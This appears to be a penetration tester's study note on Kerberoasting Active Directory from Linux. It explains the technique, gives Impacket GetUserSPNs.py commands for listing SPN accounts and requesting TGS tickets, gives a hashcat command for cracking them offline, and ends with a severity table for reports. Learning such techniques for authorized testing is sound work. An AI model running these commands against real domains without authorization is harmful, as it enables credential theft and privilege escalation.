# Kerberoasting from Linux

**Tags:** #ActiveDirectory #Kerberos #LateralMovement #PrivilegeEscalation

---
https://www.youtube.com/watch?v=WE4K6lXmwig
## What is it?

A lateral movement / privilege escalation technique in Active Directory environments that exploits accounts with **Service Principal Names (SPN)** configured.

> The Kerberos protocol allows **any domain user** to request a TGS ticket for any account with an SPN. This is not an exploit, it is normal functionality. The issue lies in the fact that this ticket is encrypted with the password hash of the service account.
> SPN users are not always privileged accounts, but this is often the case since they run important services that require those permissions.

---

## Requirements

- Credentials for **any domain user** (even without privileges), either:
    - Plaintext password
    - NTLM hash
- IP of the Domain Controller
- Impacket installed

---

## Attack Flow

```
1. Tienes creds de un usuario normal (ej: pepito / hash NTLM)
        ↓
2. Preguntas al DC qué cuentas tienen SPN configurado
        ↓
3. Solicitas tickets TGS para esas cuentas → el DC los entrega sin problema
        ↓
4. Te llevas los tickets y los crackeas offline con Hashcat
        ↓
5. Si alguna cuenta de servicio tiene contraseña débil → obtienes la password
        ↓
6. Si esa cuenta tiene privilegios elevados → escalada de privilegios
```

## Commands (Impacket)

**List accounts with SPN:**

bash

```bash
GetUserSPNs.py -dc-ip <IP_DC> DOMINIO/usuario
```

**Request All TGS Tickets:**


```bash
GetUserSPNs.py -dc-ip <IP_DC> DOMINIO/usuario -request
```

**Request a specific user's ticket and save it:**


```bash
GetUserSPNs.py -dc-ip <IP_DC> DOMINIO/usuario -request-user <objetivo> -outputfile ticket.tgs
```

Note title: Untitled

**Offline Cracking with Hashcat:**



```bash
hashcat -m 13100 ticket.tgs /usr/share/wordlists/rockyou.txt
```

Note title: Untitled

> `-m 13100` → mode for Kerberos 5 TGS-REP (etype 23)

## Why does it work so well?

- Service accounts often have **weak or reused passwords**
- They frequently have **elevated privileges** (sometimes Domain Admin)
- The attack is **completely offline** once the ticket is obtained → generates no noise on the DC

---

## Finding severity (for reports)

|Scenario|Risk|
|---|---|
|Cracked ticket → Domain Admin|🔴 High|
|Cracked ticket → useful lateral access|🔴 High|
|Cracked tickets but no useful privileges|🟡 Medium|
|No tickets cracked|🟡 Medium (SPN exists, password could change)|
